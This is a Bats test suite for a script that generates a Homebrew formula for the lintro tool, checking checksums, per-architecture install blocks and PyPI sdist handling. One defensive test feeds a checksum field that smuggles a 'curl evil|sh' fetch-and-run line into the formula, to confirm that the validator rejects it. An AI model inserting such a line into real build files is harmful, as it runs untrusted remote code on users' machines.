#!/usr/bin/env bats
# SPDX-License-Identifier: MIT
# Purpose: Tests for binary formula generation.

load "../../../helpers/common"

setup() {
	setup_temp_dir
	REPO_ROOT="$(repo_root)"
	bootstrap_test_env "$REPO_ROOT"
	SCRIPTS_DIR="$REPO_ROOT/scripts/ci"
}

teardown() {
	teardown_temp_dir
}

# Derive the committed lintro binary version and per-arch shas so the tests
# track releases instead of pinning literals that break on every version bump.
committed_version() {
	sed -nE 's/^[[:space:]]*version[[:space:]]+"([^"]+)".*/\1/p' \
		"$REPO_ROOT/Formula/lintro.rb" | head -1
}

committed_sha() { # $1 = on_arm | on_intel
	awk -v blk="$1" '
		$0 ~ blk { f = 1 }
		f && /sha256/ { gsub(/[",]/, "", $2); print $2; exit }
	' "$REPO_ROOT/Formula/lintro.rb"
}

# The on_intel block carries the PyPI sdist of the same version.
committed_sdist_url() {
	sed -nE 's/^[[:space:]]*url[[:space:]]+"(https:\/\/files\.pythonhosted\.org[^"]+\.tar\.gz)".*/\1/p' \
		"$REPO_ROOT/Formula/lintro.rb" | head -1
}

# Today's dispatch payload: arm64 and x86_64 checksums. The x86 value is a
# stand-in; the generator must accept and ignore it.
LEGACY_X86_SHA="e56b1f9d74e210a70d13b1d43e6924eaeab2af91a71703aeb9f9b184cb23ea75"

committed_assets_arm64_only() {
	printf '{"arm64-sha":"%s"}' "$(committed_sha on_arm)"
}

committed_assets_legacy() {
	printf '{"arm64-sha":"%s","x86-sha":"%s"}' \
		"$(committed_sha on_arm)" "$LEGACY_X86_SHA"
}

# Serve the committed sdist url/sha through the PYPI_FIXTURE_DIR seam so the
# generator never talks to PyPI and the parity test stays green across
# releases without fixture edits.
setup_pypi_fixture() {
	PYPI_FIXTURE_DIR="$TEST_TEMP_DIR/pypi"
	mkdir -p "$PYPI_FIXTURE_DIR"
	python3 - "$PYPI_FIXTURE_DIR/lintro-$(committed_version).json" \
		"$(committed_version)" "$(committed_sdist_url)" "$(committed_sha on_intel)" <<'EOF'
import json, sys
path, version, url, sha = sys.argv[1:]
data = {
    "info": {"version": version},
    "urls": [{"packagetype": "sdist", "url": url, "digests": {"sha256": sha}}],
}
with open(path, "w", encoding="utf-8") as handle:
    json.dump(data, handle)
EOF
	export PYPI_FIXTURE_DIR
}

run_generate() { # $1 = binary-assets json, rest = extra args
	local assets="$1"
	shift
	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version "$(committed_version)" \
		--output "$TEST_TEMP_DIR/lintro.rb" \
		--binary-assets "$assets" \
		"$@"
}

@test "generate-binary-formula: lintro binary structure and SHAs" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture
	output_file="$TEST_TEMP_DIR/lintro.rb"
	version="$(committed_version)"
	arm="$(committed_sha on_arm)"

	run_generate "$(committed_assets_arm64_only)"

	[ "$status" -eq 0 ]
	grep -q '# typed: strict' "$output_file"
	grep -q 'class Lintro < Formula' "$output_file"
	grep -q "version \"${version}\"" "$output_file"
	grep -q "$arm" "$output_file"
	grep -q 'lintro-macos-arm64' "$output_file"
	grep -q 'conflicts_with "lintro-full"' "$output_file"
	grep -q 'doctor_cmd = "#{utf8} #{bin}/lintro doctor 2>&1"' "$output_file"
}

@test "generate-binary-formula: on_arm installs the release binary" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture
	output_file="$TEST_TEMP_DIR/lintro.rb"

	run_generate "$(committed_assets_arm64_only)"

	[ "$status" -eq 0 ]
	# The on_arm block points at the GitHub release asset with the dispatched sha.
	awk '/on_arm do/,/end/' "$output_file" |
		grep -q 'releases/download/v#{version}/lintro-macos-arm64'
	awk '/on_arm do/,/end/' "$output_file" |
		grep -q "sha256 \"$(committed_sha on_arm)\""
	grep -q 'bin.install "lintro-macos-arm64" => "lintro"' "$output_file"
	# The x86_64 release asset is gone from the formula entirely.
	! grep -q 'lintro-macos-x86_64' "$output_file"
}

@test "generate-binary-formula: on_intel installs lintro[mcp] from the PyPI sdist" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture
	output_file="$TEST_TEMP_DIR/lintro.rb"

	run_generate "$(committed_assets_arm64_only)"

	[ "$status" -eq 0 ]
	grep -q 'include Language::Python::Virtualenv' "$output_file"
	# The on_intel block carries the same-version sdist and the Python dep.
	intel_block="$(awk '/on_intel do/,/^    end$/' "$output_file")"
	grep -qF "url \"$(committed_sdist_url)\"" <<<"$intel_block"
	grep -qF "sha256 \"$(committed_sha on_intel)\"" <<<"$intel_block"
	grep -q 'depends_on "python@3.13"' <<<"$intel_block"
	grep -q "lintro-$(committed_version).tar.gz" <<<"$intel_block"
	# Install branch: virtualenv plus a pip install of the staged sdist with
	# the mcp extra, then the venv entry point is linked into bin.
	grep -q 'virtualenv_create(libexec, "python3.13")' "$output_file"
	grep -q '"--python=#{libexec}/bin/python", "install",' "$output_file"
	grep -q '"#{buildpath}\[mcp\]"' "$output_file"
	grep -q 'bin.install_symlink libexec/"bin/lintro"' "$output_file"
}

@test "generate-binary-formula: accepts the legacy two-checksum payload" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture
	output_file="$TEST_TEMP_DIR/lintro.rb"

	run_generate "$(committed_assets_legacy)"

	[ "$status" -eq 0 ]
	[[ "$output" == *"Ignoring binary-assets x86-sha"* ]]
	# The legacy x86 checksum never reaches the formula.
	! grep -q "$LEGACY_X86_SHA" "$output_file"
	assert_files_equal "$REPO_ROOT/Formula/lintro.rb" "$output_file"
}

@test "generate-binary-formula: legacy and arm64-only payloads render identically" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture

	run_generate "$(committed_assets_arm64_only)"
	[ "$status" -eq 0 ]
	cp "$TEST_TEMP_DIR/lintro.rb" "$TEST_TEMP_DIR/lintro-arm64-only.rb"

	run_generate "$(committed_assets_legacy)"
	[ "$status" -eq 0 ]

	assert_files_equal "$TEST_TEMP_DIR/lintro-arm64-only.rb" "$TEST_TEMP_DIR/lintro.rb"
}

@test "generate-binary-formula: rejects non-hex arm64 sha" {
	setup_pypi_fixture
	binary_assets="{\"arm64-sha\":\"deadbeef\\\"\\n    system \\\"curl evil|sh\\\"\\n    sha256 \\\"x\"}"

	run_generate "$binary_assets"

	[ "$status" -ne 0 ]
	[[ "$output" == *"arm64-sha must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: rejects non-hex legacy x86 sha" {
	setup_pypi_fixture
	binary_assets="{\"arm64-sha\":\"$(committed_sha on_arm)\",\"x86-sha\":\"deadbeef\"}"

	run_generate "$binary_assets"

	[ "$status" -ne 0 ]
	[[ "$output" == *"x86-sha, when present, must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: rejects a payload without arm64-sha" {
	setup_pypi_fixture

	run_generate "{\"x86-sha\":\"$LEGACY_X86_SHA\"}"

	[ "$status" -ne 0 ]
	[[ "$output" == *"arm64-sha must be a 64-character lowercase hex"* ]]
}

@test "generate-binary-formula: fails when the PyPI sdist is unavailable" {
	export SKIP_ASSET_VERIFY=1
	PYPI_FIXTURE_DIR="$TEST_TEMP_DIR/pypi-empty"
	mkdir -p "$PYPI_FIXTURE_DIR"
	export PYPI_FIXTURE_DIR

	run_generate "$(committed_assets_arm64_only)"

	[ "$status" -ne 0 ]
	[[ "$output" == *"Missing PyPI fixture for lintro"* ]]
}

@test "generate-binary-formula: --pypi-package overrides the sdist source" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture

	run_generate "$(committed_assets_arm64_only)" --pypi-package lintro-renamed

	[ "$status" -ne 0 ]
	[[ "$output" == *"Missing PyPI fixture for lintro-renamed"* ]]
}

@test "generate-binary-formula: parity with committed lintro.rb" {
	export SKIP_ASSET_VERIFY=1
	setup_pypi_fixture
	output_file="$TEST_TEMP_DIR/lintro.rb"

	# Regenerate using the version and shas read straight from the committed
	# formula, so this stays green across releases without fixture edits.
	run_generate "$(committed_assets_arm64_only)"

	[ "$status" -eq 0 ]
	assert_files_equal "$REPO_ROOT/Formula/lintro.rb" "$output_file"
}
